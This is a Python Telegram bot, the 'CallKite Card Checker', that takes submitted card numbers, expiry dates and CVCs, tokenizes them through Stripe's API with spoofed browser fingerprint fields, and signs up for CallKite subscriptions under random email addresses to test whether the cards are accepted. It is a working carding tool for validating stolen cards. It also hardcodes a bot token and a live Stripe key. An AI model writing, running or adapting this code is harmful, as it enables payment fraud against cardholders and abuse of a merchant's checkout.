import telebot
import requests
import random
import string

BOT_TOKEN = "7194711538:AAHr734HrJWS7fub791CMhyJpDlDCcrF2ww"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_aS5XfyascG0bAVDXZDAZdX4j"  # From your data

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 CallKite Card Checker\n"
        "Send card details in this format:\n"
        "<code>CardNumber|MM|YY|CVC</code>\n"
        "Example:\n<code>5275150097242499|09|28|575</code>",
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: '|' in m.text)
def card_handler(message):
    try:
        card_number, exp_month, exp_year, cvc = map(str.strip, message.text.split('|'))
        email = generate_random_email()
        plan = "monthly"

        # 1. Create Stripe token
        # Stripe expects form-urlencoded data
        stripe_data = {
            "card[number]": card_number.replace(" ", ""),
            "card[cvc]": cvc,
            "card[exp_month]": exp_month.zfill(2),
            "card[exp_year]": exp_year if len(exp_year) == 4 else "20" + exp_year,
            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
            "time_on_page": str(random.randint(10000, 99999)),
            "referrer": "https://callkite.com",
            "key": STRIPE_PUBLISHABLE_KEY
        }

        stripe_resp = requests.post(
            "https://api.stripe.com/v1/tokens",
            data=stripe_data,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/"
            }
        )
        stripe_json = stripe_resp.json()

        if "error" in stripe_json:
            bot.reply_to(message, f"❌ Card Declined (Stripe):\n{stripe_json['error'].get('message', 'Unknown error')}")
            return

        token = stripe_json.get("id")
        if not token or not token.startswith("tok_"):
            bot.reply_to(message, f"❌ Failed to get Stripe token:\n{stripe_json}")
            return

        # 2. Use token to signup on CallKite
        signup_payload = {
            "email": email,
            "token": token,
            "plan": plan
        }
        signup_resp = requests.post(
            "https://callkite.com/api/signup",
            json=signup_payload,
            headers={
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://callkite.com",
                "referer": "https://callkite.com/signup"
            }
        )
        signup_json = signup_resp.json()

        # 3. Check success or failure
        if signup_json.get("success") is True:
            subscription_id = signup_json.get("subscription", {}).get("id", "N/A")
            bot.reply_to(message, f"✅ Your Card Was Added\nSubscription ID: {subscription_id}\nEmail used: {email}")
        else:
            error_message = signup_json.get("message", "Something went wrong")
            bot.reply_to(message, f"❌ Card Declined or Error:\n{error_message}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.infinity_polling()